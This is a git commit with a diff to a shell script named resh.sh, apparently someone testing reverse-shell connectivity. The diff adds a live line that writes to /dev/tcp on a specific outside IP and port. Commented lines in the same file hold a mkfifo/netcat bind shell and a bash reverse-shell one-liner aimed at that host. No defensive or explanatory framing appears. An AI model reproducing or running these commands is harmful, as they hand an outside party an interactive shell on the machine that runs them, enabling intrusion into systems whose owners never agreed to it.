d7deaa77032622e6717b8f6c5edccf0b3d0000ab
Frank Lin <knarf.lin@yahoo.com>
2019-10-24 15:28:43 +0800

    ech

--- resh.sh
+++ resh.sh
@@ -1,4 +1,5 @@
+echo working > /dev/tcp/140.112.30.43/12345
 # rm -f /tmp/f; mkfifo /tmp/f
 # cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 12345 > /tmp/f
-sleep 3
+# sleep 3
 # bash -c 'bash -i >& /dev/tcp/140.112.30.43/12345 0>&1'
